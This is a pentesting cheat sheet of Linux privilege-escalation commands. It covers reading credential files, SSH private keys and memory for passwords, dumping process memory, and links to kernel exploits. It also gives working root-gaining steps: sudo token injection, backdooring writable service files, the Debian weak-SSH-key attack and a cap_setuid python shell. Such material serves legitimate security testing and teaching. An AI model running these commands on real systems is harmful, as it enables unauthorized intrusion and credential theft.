---
description: >-
  quick commands to enumerate the target system. these are taken from different
  sources and combined together with a little modification.
---

# ⭕ Enumeration

## <mark style="color:red;">system information</mark>

### &#x20;<mark style="color:orange;">distribution type and version</mark>

#### `cat /etc/issue`

#### &#x20;`cat /etc/*-release`

#### &#x20;`cat /etc/lsb-release`&#x20;

#### &#x20;`cat /etc/redhat-release`

### <mark style="color:orange;">kernel version</mark>

#### `cat /proc/version`

#### &#x20;`uname -a`&#x20;

#### `uname -mrs`

#### &#x20;`cat /proc/$$/status | grep "[UG]id"`

#### &#x20;`rpm -q kernel`&#x20;

#### `dmesg | grep Linux`&#x20;

#### `ls /boot | grep vmlinuz-`

### <mark style="color:orange;">places to find kernel exploits:</mark>

[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)\
[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
[https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)\
[https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)

#### To extract all the vulnerable kernel versions from that web you can do:

`curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '`

{% hint style="warning" %}
`This technique is for kernels up to 3.9.6 and is not reliable for later versions of Linux kernel.`
{% endhint %}

#### Tools that could help searching for kernel exploits are:

[https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
[https://github.com/jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)\
[http://www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)

### <mark style="color:orange;">Big UID</mark> <a href="#big-uid" id="big-uid"></a>

Some Linux versions were affected by a bug that allow users with **UID > INT\_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674). **Exploit it** using:&#x20;

**`systemd-run -t /bin/bash`**

### <mark style="color:orange;">sudo\_inject</mark>

#### this has requirements, doesn't work all the time.

#### clone the repository and run the script:

#### &#x20;[sudo\_inject](https://github.com/nongiach/sudo\_inject)&#x20;

#### requirements:

#### `$ sudo whatever`&#x20;

#### `[sudo] password for user:` `# Press+c since you don't have the password.`&#x20;

#### `# This creates an invalid sudo tokens.`&#x20;

#### `$ sh exploit.sh` `.... wait 1 seconds`&#x20;

#### `$ sudo -i # no password required :)`&#x20;

#### `# id`

#### &#x20;`uid=0(root) gid=0(root) groups=0(root)`

#### for more methods related to sudo refer to [sudo abuse](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/untitled/privilege-escalation/sudo-abuse) section.

### <mark style="color:orange;">environmental variables</mark>

see [environment variables section](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/untitled/privilege-escalation/environment-variables) for methods

#### `cat /etc/profile`&#x20;

#### `cat /home/*/.bashrc | grep alias | grep -v "#"`

#### &#x20;`cat /root/.bashrc | grep alias | grep -v "#"`&#x20;

#### `cat ~/.bash_profile`

#### &#x20;`cat ~/.bashrc` `cat ~/.bash_logout`&#x20;

#### `env`&#x20;

#### `set`

### <mark style="color:orange;">in-memory password</mark>

#### `strings /dev/mem -n10 | grep -i PASS`

### <mark style="color:orange;">driver info</mark>

#### `lsmod` `/sbin/modinfo [lib]` `ls /dev 2>/dev/null | grep -i "sd"` `cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null` \`\` `#Check if credentials in fstab` `grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null`

### <mark style="color:orange;">available shells</mark>

#### `cat /etc/shells |grep "bin"|cut -d "/" -f3 2>/dev/null`

### <mark style="color:orange;">programming languages</mark>

#### ``progr_dev=( "which perl" "which gcc" "which g++" "which python" "which php" "which cc" "which go" "which node") ;for programming_lang in "${progr_dev[@]}"; do pss=`$programming_lang |cut -d"/" -f4` ;if [ "$pss" ]; then echo -e "$pss" ;fi done``

### <mark style="color:orange;">check emails</mark>

#### `mail && ls -alh /var/mail/`

### <mark style="color:orange;">printers</mark>

#### `lpstat -a`

### <mark style="color:orange;">network connections/hosts</mark>

#### `lsof -i`&#x20;

#### `lsof -i :80` `grep 80 /etc/services`&#x20;

#### `netstat -antup`&#x20;

#### `netstat -antpx`&#x20;

#### `netstat -tulpn` `chkconfig --list`&#x20;

#### `chkconfig --list | grep 3:on`&#x20;

#### `last`&#x20;

#### `w`&#x20;

#### `cat /etc/sudoers`

### <mark style="color:orange;">available file transfer methods</mark>

#### `find / -name wget`&#x20;

#### ``

#### `find / -name nc*` `find / -name netcat*`&#x20;

#### `find / -name tftp*`

#### &#x20;`find / -name ftp`

## <mark style="color:red;">users and accounts</mark>

### <mark style="color:orange;">check for sudo access</mark>

#### `sudo -l |grep vim` `sudo -l |grep nmap`&#x20;

#### `sudo -l |grep vi`&#x20;

#### `sudo -l`

### <mark style="color:orange;">users UID and GID</mark>

#### `for user in $(cat /etc/passwd | cut -f1 -d":"); do id $user; done`

### <mark style="color:orange;">UID 0 accounts (root)</mark>

#### `cat /etc/passwd |cut -f1,3,4 -d":" |grep "0:0" |cut -f1 -d":"|awk '{print $1}'`

### <mark style="color:orange;">users readable history file</mark>

#### `find /home/* -name *.*history* -print 2> /dev/null`

### <mark style="color:orange;">check history</mark>

#### `cat ~/.bash_history`

#### &#x20;`cat ~/.nano_history`

#### &#x20;`cat ~/.atftp_history`&#x20;

#### `cat ~/.mysql_history`&#x20;

#### `cat ~/.php_history`

### <mark style="color:orange;">user info</mark>

#### `cat ~/.bashrc`

#### &#x20;`cat ~/.profile`&#x20;

#### `cat /var/mail/root`

#### &#x20;`cat /var/spool/mail/root`

## <mark style="color:red;">Possible defenses</mark>

#### <mark style="color:green;">AppArmor</mark>

```
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

#### <mark style="color:green;">Grsecurity</mark>

```
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

#### <mark style="color:green;">`PaX`</mark>

```
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

#### <mark style="color:green;">Execshield</mark>

#### `(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")` SElinux

#### `(sestatus 2>/dev/null || echo "Not found sestatus")` ASLR

#### `cat /proc/sys/kernel/randomize_va_space 2>/dev/null` `#If 0, not enabled`

## <mark style="color:red;">network</mark>

### <mark style="color:orange;">network configurations</mark>

#### `cat /etc/resolv.conf`

#### &#x20;`cat /etc/sysconfig/network`&#x20;

#### `cat /etc/networks`&#x20;

#### `iptables -L`&#x20;

#### `hostname`

#### &#x20;`dnsdomainname`

### <mark style="color:orange;">network status</mark>

#### `ss -anp`&#x20;

#### `netstat -ano`

#### &#x20;`/sbin/ifconfig -a`&#x20;

#### `cat /etc/network/interfaces`&#x20;

#### `cat /etc/sysconfig/network`&#x20;

#### `arp -e`&#x20;

#### `route`

#### &#x20;`/sbin/route -nee`

### <mark style="color:orange;">try packet sniffing</mark>

#### `tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21`

### <mark style="color:orange;">firewall rules</mark>

#### `/etc/iptables`

#### &#x20;`iptables -L`&#x20;

#### `grep -Hs iptables /etc/*`

### <mark style="color:orange;">hosts and DNS</mark>

#### `cat /etc/hosts 2>/dev/null && cat /etc/resolv.conf 2>/dev/null && cat /etc/sysconfig/network 2>/dev/null && cat /etc/networks 2>/dev/null | uniq | srt | grep -v '#'`

### <mark style="color:orange;">ssh root login status</mark>

#### `cat /etc/ssh/sshd_config | grep PermitRootLogin | grep -v "#"`

### <mark style="color:orange;">ssh info</mark>

#### `cat ~/.ssh/identity.pub ~/.ssh/authorized_keys ~/.ssh/identity ~/.ssh/id_rsa.pub ~/.ssh/id_rsa ~/.ssh/id_dsa.pub ~/.ssh/id_dsa /etc/ssh/ssh_config /etc/ssh/sshd_config /etc/ssh/ssh_host_dsa_key.pub /etc/ssh/ssh_host_dsa_key /etc/ssh/ssh_host_rsa_key.pub /etc/ssh/ssh_host_rsa_key /etc/ssh/ssh_host_key.pub /etc/ssh/ssh_host_key 2>/dev/null`

## <mark style="color:red;">tasks and processes</mark>

process binaries paths and permissions

#### `ps aux | awk '{print $11}' |xargs -r ls -la 2>/dev/null |awk '!x[$0]++'`

### <mark style="color:orange;">find new running processes</mark>

#### `#!/bin/bash` `#Loop by line` `IFS=$'\n'` `old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)` `while true; do` `new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)` `diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]` `sleep 1` `old_process=$new_process`

### <mark style="color:orange;">check services and privileges</mark>

#### `ps aux` `ps -ef` `ps aux | grep "^root"` `top` `cat /etc/services`

#### <mark style="color:green;">Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!</mark>

#### `ps aux | grep root` `ps -ef | grep root`

#### <mark style="color:green;">What applications are installed? What version are they? Are they currently running?</mark>

#### `ls -alh /usr/bin/`&#x20;

#### `ls -alh /sbin/` `dpkg -l | grep` `rpm -qa | grep`&#x20;

#### `ls -alh /var/cache/apt/archives`&#x20;

#### `ls -alh /var/cache/yum/`

### <mark style="color:orange;">scheduled Tasks</mark>

see [cron/crontab abuse section](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/untitled/privilege-escalation/cron-crontab-abuse) for methods

#### `ls -lah /etc/cron*`&#x20;

#### `cat /etc/crontab` `crontab -l`&#x20;

#### `ls -alh /var/spool/cron`

#### &#x20;`ls -al /etc/ | grep cron` `ls -al /etc/cron*` `cat /etc/cron*`&#x20;

#### `cat /etc/at.allow`&#x20;

#### `cat /etc/at.deny`&#x20;

#### `cat /etc/cron.allow`

#### &#x20;`cat /etc/cron.deny`&#x20;

#### `cat /etc/crontab`

#### &#x20;`cat /etc/anacrontab`&#x20;

#### `cat /var/spool/cron/crontabs/root`

## <mark style="color:red;">process monitoring</mark>

\
[this](https://github.com/DominicBreuker/pspy) can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### <mark style="color:orange;">**Process memory**</mark>

#### Some services of a server save credentials in clear text inside the memory. Normally you will need root privileges to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials. However, remember that as a regular user you can read the memory of the processes you own. To dump a process memory you could use: [https://github.com/hajzer/bash-memory-dump](https://github.com/hajzer/bash-memory-dump) You can manually remove root requirements and dump process owned by you Script A.5 from [https://www.delaat.net/rp/2016-2017/p97/report.pdf](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required) \*\*\*\*

### <mark style="color:orange;">Process Memory Credentials</mark>

#### [this tool](https://github.com/huntergregal/mimipenguin) will steal clear text credentials from memory and from some well known files. It requires root privileges to work properly.

### <mark style="color:orange;">**/proc/$pid/maps & /proc/$pid/mem**</mark>

#### For a given process ID, maps shows how memory is mapped within that processes' virtual address space; it also shows the permissions of each mapped region. The mem pseudo file exposes the processes memory itself. From the maps file we know which memory regions are readable and their offsets. We use this information to seek into the mem file and dump all readable regions to a file.

#### &#x20;`procdump() (` `cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"` `while read a b; do` `dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \` `skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"` `done )` `cat $1*.bin > $1.dump` `rm $1*.bin` `)`

### <mark style="color:orange;">**/dev/mem**</mark>

#### /dev/mem provides access to the system's physical memory, not the virtual memory. The kernels virtual address space can be accessed using /dev/kmem. Typically, /dev/mem is only readable by root and kmem group.&#x20;

#### `strings /dev/mem -n10 | grep -i PASS`

## <mark style="color:red;">programs and software</mark>

### <mark style="color:orange;">enumerate useful binaries</mark>

#### `which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc rkt kubectl 2>/dev/null`

### <mark style="color:orange;">enumerate compilers</mark>

#### `(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")`

### <mark style="color:orange;">installed software/packages</mark>

#### `dpkg -l` `rpm -q`

####

#### <mark style="color:green;">service(s) settings misconfigured? Are any (vulnerable) plugins attached?</mark>

#### `cat /etc/syslog.conf`&#x20;

#### `cat /etc/chttp.conf`&#x20;

#### `cat /etc/lighttpd.conf`

#### &#x20;`cat /etc/cups/cupsd.conf`

#### &#x20;`cat /etc/inetd.conf`

#### &#x20;`cat /etc/apache2/apache2.conf`&#x20;

#### `cat /etc/my.conf`

#### &#x20;`cat /etc/httpd/conf/httpd.conf`&#x20;

#### `cat /opt/lampp/etc/httpd.conf`

#### &#x20;`ls -aRl /etc/ | awk '$1 ~ /^.*r.*/`

#### <mark style="color:green;">Which configuration files can be written in /etc/? Able to reconfigure a service?</mark>

#### `ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null # Anyone`&#x20;

#### `ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null # Owner`&#x20;

#### `ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null # Group`&#x20;

#### `ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null # Other`&#x20;

#### `find /etc/ -readable -type f 2>/dev/null # Anyone`&#x20;

#### `find /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone`&#x20;

#### `ls -alh /var/log` `ls -alh /var/mail`&#x20;

#### `ls -alh /var/spool`&#x20;

#### `ls -alh /var/spool/lpd`&#x20;

#### `ls -alh /var/lib/pgsql`&#x20;

#### `ls -alh /var/lib/mysql`

#### &#x20;`cat /var/lib/dhcp3/dhclient.leases`

#### &#x20;`ls -alhR /var/www/`

#### &#x20;`ls -alhR /srv/www/htdocs/`&#x20;

#### `ls -alhR /usr/local/www/apache22/data/`&#x20;

#### `ls -alhR /opt/lampp/htdocs/`

#### &#x20;`ls -alhR /var/www/html/`

## <mark style="color:red;">Services</mark> <a href="#services" id="services"></a>

### <mark style="color:orange;">Writable</mark> <mark style="color:orange;"></mark>_<mark style="color:orange;">.service</mark>_ <mark style="color:orange;"></mark><mark style="color:orange;">files</mark> <a href="#writable-service-files" id="writable-service-files"></a>

Check if you can write any `.service` file, if you can, you **could modify it** so it **executes** your **backdoor when** the service is **started**, **restarted** or **stopped** (maybe you will need to wait until the machine is rebooted). For example create your backdoor inside the .service file with **`ExecStart=/tmp/script.sh`**

### <mark style="color:orange;">Writable service binaries</mark> <a href="#writable-service-binaries" id="writable-service-binaries"></a>

Keep in mid that if you have **write permissions over binaries being executed by services**, you can change them for backdoors so when the services get re-executed the backdoors will be executed.

### <mark style="color:orange;">systemd PATH - Relative Paths</mark> <a href="#systemd-path-relative-paths" id="systemd-path-relative-paths"></a>

You can see the PATH used by **systemd** with:

#### `systemctl show-environment`

If you find that you can **write** in any of the folders of the path you may be able to **escalate privileges**.You need to search for **relative paths being used on service configurations**

Then, create a **executable** with the **same name as the relative path binary** inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action (**Start**, **Stop**, **Reload**), your **backdoor will be executed** (unprivileged users usually cannot start/stop services but check if you can using `sudo -l`).

## <mark style="color:red;">files and directories</mark>

### <mark style="color:orange;">find all SUID/SGID binaries</mark>

#### `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

#### check [SUID/SGID abuse](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/untitled/privilege-escalation/suid-sgid) section to see methods.

#### see [/etc/shadow & /etc/passwd section](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/untitled/privilege-escalation/etc-shadow-and-etc-passwd) to see how you can use these files with read/write permission for privilege escalation.

#### see[ shared object injection section](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/untitled/privilege-escalation/environment-variables) for methods related to SUID binaries and dynamically loadable libraries.



### <mark style="color:orange;">NFS mounts</mark>

#### `showmount -e 192.168.1.25`

#### see [NFS section](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/untitled/privilege-escalation/nfs) for related methods.

### <mark style="color:orange;">find password in php files</mark>

#### `find / -maxdepth 5 -name *.php -type f -exec grep -Hn password {} \; 2>/dev/null`

### <mark style="color:orange;">find writable files</mark>

#### `find / -writable -type d 2>/dev/null`

### <mark style="color:orange;">find SUID files</mark>

#### `find / -perm -u=s -type f 2>/dev/null`

#### &#x20;`find / -perm -4000 -type f 2>/dev/null`

### <mark style="color:orange;">Find SUID files owned by root</mark>

#### `find / -uid 0 –perm -4000 –type f 2>/dev/null`

### <mark style="color:orange;">Find GUID files</mark>

#### `find / -perm -2000 -type -f 2>/dev/null`

### <mark style="color:orange;">Find world-writable files</mark>

#### `find -perm -2 -type f 2>/dev/null`

### <mark style="color:orange;">List all conf files in /etc/</mark>

#### `ls -al /etc/*.conf` `grep pass* /etc/*.conf >>> containing passwords`

### <mark style="color:orange;">conf files with “pass\*” string</mark>

#### `grep pass* /etc/*.conf`&#x20;

#### `grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null`

#### &#x20;`find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;`

### <mark style="color:orange;">list of open files</mark>

#### `lsof -n`

### <mark style="color:orange;">last edited files</mark>

#### `find / -mmin -10 2>/dev/null | grep -Ev "^/proc"`

### <mark style="color:orange;">R/W Files and Directories</mark>

#### `find / -writable -type d 2>/dev/null`

### <mark style="color:orange;">mount volumes</mark>

#### `cat /etc/fstab` `mount` `/bin/lsblk`

### <mark style="color:orange;">search for SUID set</mark>

#### `find / -perm -u=s -type f 2>/dev/null`

### <mark style="color:orange;">plain text usernames/passwords</mark>

#### `grep -i user [filename]`&#x20;

#### `grep -i pass [filename]`&#x20;

#### `grep -C 5 "password" [filename]`

#### &#x20;`find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla`

#### <mark style="color:green;">What sensitive files can be found?</mark>

#### `cat /etc/passwd`&#x20;

#### `cat /etc/group`&#x20;

#### `cat /etc/shadow`&#x20;

#### `ls -alh /var/mail/`

### <mark style="color:orange;">ssh key info</mark>

#### `cat ~/.ssh/authorized_keys`

#### &#x20;`cat ~/.ssh/identity.pub`&#x20;

#### `cat ~/.ssh/identity`&#x20;

#### `cat ~/.ssh/id_rsa.pub`

#### &#x20;`cat ~/.ssh/id_rsa`&#x20;

#### `cat ~/.ssh/id_dsa.pub`&#x20;

#### `cat ~/.ssh/id_dsa`&#x20;

#### `cat /etc/ssh/ssh_config`

#### &#x20;`cat /etc/ssh/sshd_config`&#x20;

#### `cat /etc/ssh/ssh_host_dsa_key.pub`

#### &#x20;`cat /etc/ssh/ssh_host_dsa_key`&#x20;

#### `cat /etc/ssh/ssh_host_rsa_key.pub`&#x20;

#### `cat /etc/ssh/ssh_host_rsa_key`&#x20;

#### `cat /etc/ssh/ssh_host_key.pub`&#x20;

#### `cat /etc/ssh/ssh_host_key`

SSH Key Predictable PRNG (Authorized\_Keys) Process\\

#### use an obtained authorized\_keys file on a host system. Needed : SSH-DSS String from authorized\_keys file 1. Get the authorized\_keys file. An example of this file would look like so:

#### `ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ...`

#### 2. Since this is an ssh-dss key, we need to add that to our local copy of /etc/ssh/ssh\_config and /etc/ssh/sshd\_config:

#### `echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/ssh_config`&#x20;

#### `echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/sshs_config`&#x20;

#### `/etc/init.d/ssh restart` \`\`

#### Get [g0tmi1k's debian-ssh repository](https://github.com/g0tmi1k/debian-ssh) and unpack the keys:

#### `git clone https://github.com/g0tmi1k/debian-ssh`

#### &#x20;`cd debian-ssh`&#x20;

#### `tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2`

#### 3. Grab the first 20 or 30 bytes from the key file shown above starting with the "AAAA..." portion and grep the unpacked keys with it as:

#### `grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'` `dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub`

#### 5. IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the '.pub' extension and do:

#### `ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934` \`\`

#### And you should connect without requiring a password. If stuck, the -vvv verbosity should provide enough details as to why.

log files\\

#### `cat /etc/httpd/logs/access_log`

#### &#x20;`cat /etc/httpd/logs/access.log`&#x20;

#### `cat /etc/httpd/logs/error_log`&#x20;

#### `cat /etc/httpd/logs/error.log`&#x20;

#### `cat /var/log/apache2/access_log`&#x20;

#### `cat /var/log/apache2/access.log`&#x20;

#### `cat /var/log/apache2/error_log`&#x20;

#### `cat /var/log/apache2/error.log`&#x20;

#### `cat /var/log/apache/access_log`&#x20;

#### `cat /var/log/apache/access.log`&#x20;

#### `cat /var/log/auth.log`&#x20;

#### `cat /var/log/chttp.log`

## <mark style="color:red;">Capabilities</mark>

### <mark style="color:orange;"><mark style="color:red;">List capabilities of binaries<mark style="color:red;"></mark>

#### `/usr/bin/getcap -r /usr/bin`

#### <mark style="color:green;">Edit capabilities</mark>

#### `/usr/bin/setcap -r /bin/ping # remove`&#x20;

#### `/usr/bin/setcap cap_net_raw+p /bin/ping # add`

#### Interesting capabilities Having the capability =ep means the binary has all the capabilities.

#### `$ getcap openssl /usr/bin/openssl` `openssl=ep`

#### Alternatively the following capabilities can be used in order to upgrade your current privileges.

#### `cap_dac_read_search # read anything` `cap_setuid+ep # setuid`

#### Example of privilege escalation with cap\_setuid+ep

#### `sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7`&#x20;

#### `python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'` `sh-5.0# id` `uid=0(root) gid=1000(swissky)` `>`

![](../../.gitbook/assets/capabilities1.png)
